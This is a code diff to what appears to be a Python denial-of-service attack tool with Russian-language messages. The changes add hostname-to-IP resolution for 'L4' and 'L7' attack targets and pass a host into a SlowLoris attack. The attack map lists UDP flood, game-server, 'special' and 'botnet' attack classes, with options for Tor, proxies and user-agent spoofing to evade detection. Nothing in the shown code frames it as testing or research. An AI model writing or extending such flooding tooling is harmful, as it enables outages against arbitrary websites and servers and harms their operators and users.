@@ -4,6 +4,8 @@ import time
 import threading
 import inspect
 import click
+import socket
+from urllib.parse import urlparse
 from rich.console import Console
 from rich.panel import Panel
 from rich.prompt import Prompt, Confirm, IntPrompt
@@ -87,21 +89,56 @@ def confirm_and_run(params, skip_confirm=False):
         import gevent.monkey
         gevent.monkey.patch_all()
 
+    # --- Target Processing ---
+    target = params['target']
+    target_ip = None
+    target_url = None
+    target_host = None
+
+    is_l4_attack = any(params['method'] in category for category in ATTACK_METHODS['L4'].values()) or params['method'] == 'SLOWLORIS'
+
+    try:
+        if is_l4_attack:
+            parsed_url = urlparse(target if '://' in target else f'http://{target}')
+            hostname = parsed_url.hostname
+            if hostname:
+                target_host = hostname
+                target_ip = socket.gethostbyname(hostname)
+                console.print(f"[green]Хост '{hostname}' разрешен в IP: {target_ip}[/green]")
+            else:
+                target_ip = target # Assume it's an IP
+                target_host = target
+        else: # L7 attack
+            if not target.startswith(('http://', 'https://')):
+                target_url = 'https://' + target
+            else:
+                target_url = target
+            parsed_url = urlparse(target_url)
+            target_host = parsed_url.hostname
+            target_ip = socket.gethostbyname(target_host) if target_host else None
+
+    except socket.gaierror:
+        console.print(f"[bold red]Ошибка: Не удалось разрешить хост '{target}'. Пожалуйста, проверьте цель.[/bold red]")
+        return
+    except Exception as e:
+        console.print(f"[bold red]Произошла ошибка при обработке цели: {e}[/bold red]")
+        return
+
     # --- Config Update ---
     update_config(
-        target_ip=params['target'], target_url=params['target'], port=params['port'], 
-        threads=params['threads'], duration=params['duration'], 
-        use_tor=params.get('use_tor', False), use_proxy=params.get('use_proxy', False), 
+        target_ip=target_ip, target_url=target_url, port=params['port'],
+        threads=params['threads'], duration=params['duration'],
+        use_tor=params.get('use_tor', False), use_proxy=params.get('use_proxy', False),
         browser_type=params.get('browser_type', 'none'), browser_behaviors=params.get('behaviors', [])
     )
-    
+
     spoofing_opts = {}
     if params.get('user_agent_source') == 'file' and params.get('user_agent_file'):
         user_agents = load_user_agents_from_file(params['user_agent_file'])
         if user_agents:
             spoofing_opts['user_agent_source'] = 'file'
             CONFIG['user_agents_list'] = user_agents
-    
+
     if spoofing_opts:
         CONFIG['spoofing'] = {**CONFIG.get('spoofing', {}), **spoofing_opts}
 
@@ -121,7 +158,7 @@ def confirm_and_run(params, skip_confirm=False):
         **{m: (lambda m: lambda: UDPAttack(CONFIG['target_ip'], CONFIG['port'], CONFIG['duration'], m))(m) for m in ATTACK_METHODS['L4']['UDP']},
         **{m: (lambda m: lambda: GameAttack(CONFIG['target_ip'], CONFIG['port'], m, CONFIG['duration']))(m) for m in ATTACK_METHODS['L4']['GAME']},
         **{m: (lambda m: lambda: SpecialAttack(CONFIG['target_ip'], CONFIG['port'], CONFIG['duration'], m))(m) for m in ATTACK_METHODS['L4']['SPECIAL']},
-        'SLOWLORIS': lambda: SlowLorisAttack(CONFIG['target_ip'], CONFIG['port'], CONFIG['duration'], 'SLOWLORIS', num_sockets=CONFIG['threads']*2),
+        'SLOWLORIS': lambda: SlowLorisAttack(CONFIG['target_ip'], CONFIG['port'], CONFIG['duration'], 'SLOWLORIS', target_host=target_host, num_sockets=CONFIG['threads']*2),
         **{m: (lambda m: lambda: BotnetAttack(CONFIG['target_ip'], CONFIG['port'], m, CONFIG['duration']))(m) for m in ATTACK_METHODS['L7']['BOTNET']},
     }
     attack_instance = attack_map[params['method']]()
